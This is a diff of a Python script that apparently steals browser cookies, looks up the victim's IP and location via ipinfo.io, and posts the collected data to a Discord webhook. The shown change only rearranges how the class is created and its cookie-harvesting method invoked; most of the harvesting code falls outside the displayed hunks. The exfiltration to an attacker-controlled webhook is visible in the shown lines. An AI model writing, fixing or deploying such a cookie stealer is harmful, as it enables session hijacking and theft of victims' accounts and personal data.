@@ -9,9 +9,6 @@ webhook = 'discord.api/webhook_here'
 __credits__ = 'scooby'
 
 class main():
-   def __init__(self,webhook):
-      self.webhook = webhook
-      self.cookies(webhook)
    def cookies(self,webhook):
       listofcookies = []
       info = requests.get("http://ipinfo.io/json").json()
@@ -48,4 +45,5 @@ class main():
             requests.post(webhook,json=info)
          except:pass
 if __credits__ == "scooby":
-   main(webhook)
+   main = main()
+   main.cookies(webhook)
